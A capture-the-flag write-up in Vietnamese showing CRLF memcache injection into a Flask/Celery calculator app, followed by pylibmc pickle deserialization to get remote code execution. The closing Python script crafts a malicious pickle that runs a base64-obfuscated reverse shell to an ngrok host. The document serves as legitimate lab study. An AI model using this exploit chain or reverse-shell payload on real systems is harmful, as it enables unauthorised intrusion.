# Solution

Bài này server sử dụng package celery để tạo các task queue, đồng thời kết hợp với memcache để lưu  kết quả của các phép tính cộng trừ nhân chia giúp giảm thời gian tính toán trong những lần sau.

Dễ thấy với những bài sử dụng text-based protocol như thế này ta thường có thể inject vào backend (redis, memcache, ...). Và ở bài này cũng vậy, có thể khai thác memcache injection tại route `/calc/<operation>/<lhs>/<rhs>`

Syntax đúng của set command trong memcache như sau:

(set_command.png)

Thử inject key là `vanir` với value là `haha`

(memcahe_inject.png)

Exec vào container, telnet đến memcahe server và tiến hành kiểm tra

(inject_success_check)

-> Thành công.

Tiếp theo, mình dive source để tìm kiếm thêm thông tin cho việc rce. Server sử dụng `pylibmc` làm memcache client để thực hiện set và get data. Về `pylibmc`, nó là một thư viện python nhưng được viết bằng C và khi dive source của thằng này sẽ tìm được mảnh ghép cuối cùng để solve bài này.

Chain sẽ như sau:

```
PylibMC_Client_get ->
  _PylibMC_parse_memcached_value ->
    _PylibMC_deserialize_native ->
      _PylibMC_Unpickle_Bytes, _PylibMC_Unpickle
```

Nếu `dtype` là `PYLIBMC_FLAG_PICKLE` thì sẽ thực hiện unpickle -> rce (Source tại [đây](https://github.com/lericson/pylibmc/blob/78138d33c4156111294269a2a8f0cfcc66ac5c5c/src/_pylibmcmodule.c))

(unpickle.png)

Và check file `_pylibmcmodule.h` tại [đây](https://github.com/lericson/pylibmc/blob/78138d33c4156111294269a2a8f0cfcc66ac5c5c/src/_pylibmcmodule.h), ta thấy để thỏa mãn điều kiện thì cần giá trị của `flags` khi gửi command set là `1`

(flag_pickle.png)

Final script:
```python
import requests
import pickle, os
import urllib.parse
import base64
class RCE:
    def __reduce__(self):
        cmd = ('echo c2ggLWkgPiYgL2Rldi90Y3AvNi50Y3Aubmdyb2suaW8vMTk1MjIgMD4mMQ==|base64 -d|bash')
        return os.system, (cmd,)

url = "http://127.0.0.1:5000"

if __name__ == '__main__':

    path = f"/calc/add/123/123"

    pickledPayload = pickle.dumps(RCE(), 1)
    len_payload = len(pickledPayload)
    print(len_payload)


    set_command = b"\r\nset uwsgi_file__app_chall._add_1_1233 1 60 111"+ b"\r\n" + pickledPayload + b"\r\n"

    final_path = path + urllib.parse.quote_from_bytes(set_command)

    print(url +  final_path)
    print(requests.get(url +  final_path).text)
    print(requests.get(url + "/calc/add/1/1233").text)
```